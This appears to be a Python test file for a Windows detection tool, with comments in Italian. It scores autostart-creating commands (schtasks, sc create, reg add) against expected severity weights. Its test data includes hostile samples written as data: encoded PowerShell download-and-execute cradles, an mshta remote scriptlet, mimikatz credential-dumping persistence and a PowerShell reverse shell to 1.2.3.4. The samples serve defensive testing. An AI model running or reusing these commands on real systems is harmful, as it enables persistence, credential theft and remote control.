# -*- coding: utf-8 -*-
# SPDX-License-Identifier: Apache-2.0
# I comandi che creano una voce di avvio automatico (schtasks /create, sc create, reg add):
# si giudica quello che la voce lancera' (tc_regole.crea_avvio).
import tc_regole as R, tc_eventi
rac = tc_eventi.Raccolta()
# (riga, peso atteso come comando eseguito, peso atteso in una voce di persistenza)
CASI = [
 (u'schtasks /create /tn Updater /tr "C:\\Users\\Public\\u.exe" /sc onlogon /ru SYSTEM', 2, 2),
 (u'schtasks.exe /Create /F /TN upd /TR "powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAuADIALgAzAC4ANAAvAGEAJwApAA==" /SC MINUTE /MO 5', 3, 3),
 (u'schtasks /create /tn "Backup notturno" /tr "\\"C:\\Program Files\\Backup\\bk.exe\\" /full" /sc daily /st 02:00', 0, 0),
 (u'schtasks /create /tn x /tr "\'C:\\Users\\Public\\a b\\u.exe\' -x" /sc onlogon', 2, 2),
 (u'schtasks /create /tn GameOver /tr "C:\\TMP\\mim.exe sekurlsa::LogonPasswords > C:\\TMP\\o.txt" /sc minute /mo 5 /f', 3, 3),
 (u'schtasks /create /tn "OneDrive Standalone Update Task" /tr "%localappdata%\\Microsoft\\OneDrive\\OneDriveStandaloneUpdater.exe" /sc daily', 0, 0),
 (u'schtasks /query /tn Updater /v', 0, 0),
 (u'schtasks /run /tn Updater', 0, 0),
 (u'schtasks /create /tn x /xml C:\\Users\\Public\\t.xml', 0, 0),
 (u'schtasks /change /tn Updater /tr C:\\PerfLogs\\u.exe', 2, 2),
 (u'sc create Upd binPath= "C:\\Users\\Public\\u.exe" start= auto', 2, 2),
 (u'sc.exe create Upd binpath= C:\\PerfLogs\\u.exe', 2, 2),
 (u'sc create Upd binPath= "cmd.exe /c powershell -nop -w hidden -c \\"IEX (New-Object Net.WebClient).DownloadString(\'http://1.2.3.4/a\')\\"" start= auto', 3, 3),
 (u'sc create MySvc binPath= "C:\\Program Files\\My App\\svc.exe" start= auto DisplayName= "My Service"', 0, 0),
 (u'sc config Spooler start= auto', 0, 0),
 (u'sc query binpath= x', 0, 0),
 (u'sc config Upd binPath= "C:\\Windows\\Temp\\x.exe"', 2, 2),
 (u'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Upd /t REG_SZ /d C:\\Users\\Public\\u.exe /f', 2, 2),
 (u'reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v Upd /t REG_SZ /d "C:\\PerfLogs\\u.exe -q" /f', 2, 2),
 (u'reg.exe add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce /v x /d "mshta javascript:a=GetObject(\\"script:https://evil/x.sct\\").Exec();close();" /f', 3, 3),
 (u'REG ADD HKCU\\Environment /f /v UserInitMprLogonScript /t REG_MULTI_SZ /d "C:\\TMP\\mim.exe sekurlsa::LogonPasswords > C:\\TMP\\o.txt"', 3, 3),
 (u'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Teams /t REG_SZ /d "C:\\Users\\mario\\AppData\\Local\\Microsoft\\Teams\\Update.exe --processStart Teams.exe" /f', 0, 0),
 (u'reg add HKLM\\SOFTWARE\\MyApp /v InstallDir /t REG_SZ /d C:\\Users\\Public\\MyApp /f', 0, 0),
 (u'reg add HKCU\\Environment /v TEMP /t REG_EXPAND_SZ /d C:\\Users\\Public\\tmp /f', 0, 0),
 (u'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v App /d "C:\\Program Files\\App\\app.exe" /f', 0, 0),
 (u'reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" /v Shell /d "explorer.exe, C:\\Users\\Public\\s.exe" /f', 2, 2),
 (u'reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" /v Shell /d explorer.exe /f', 0, 0),
 (u'reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" /v AutoAdminLogon /d 1 /f', 0, 0),
 (u'reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\notepad.exe" /v Debugger /d "C:\\Users\\Public\\d.exe" /f', 2, 2),
 (u'reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\notepad.exe" /v Debugger /d "\\"C:\\Program Files\\Notepad++\\notepad++.exe\\" -notepadStyleCmdline -z" /f', 0, 0),
 (u'reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run', 0, 0),
 (u'reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Upd /f', 0, 0),
 (u'wmic os get /format:"http://1.2.3.4/a.xsl"', 3, 3),
 (u'wmic os get /format:list', 0, 0),
 (u'hh.exe http://1.2.3.4/a.chm', 2, 3),
 (u'hh.exe C:\\Windows\\Help\\mmc.chm', 0, 0),
 (u'powershell -nop -c "$c=New-Object Net.Sockets.TCPClient(\'1.2.3.4\',443);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);}"', 3, 3),
 (u'powershell -c "$t = New-Object Net.Sockets.TcpClient; $t.Connect(\'srv01\', 443); $t.Connected"', 0, 0),
 (u'powershell -c "Test-NetConnection srv01 -Port 443"', 0, 0),
]
sb = 0
for r, at_e, at_p in CASI:
    eseguibile, arg = R.spezza_comando(r)
    nome = R.con_estensione(R.nome_base(eseguibile))
    trovati = rac._giudica_processo(eseguibile, nome, r)
    e = max([0] + [x[0] for x in trovati])
    g = R.valuta_comando(r)
    p = max([{3: 3, 2: 2, 1: 0}.get(g.livello, 0), R.strumento(g.nome)[0] if R.strumento(g.nome)[0] >= 2 else 0] + [x[0] for x in R.comandi_noti(r)])
    ok = (e == at_e and p == at_p)
    if not ok: sb += 1
    print ('ok ' if ok else 'NO '), 'E=%d(%d) P=%d(%d)' % (e, at_e, p, at_p), r[:70].encode('utf-8'), '|', (u'; '.join([x[2] for x in trovati]) or g.motivo()).encode('utf-8')[:150]
print 'sbagliati', sb
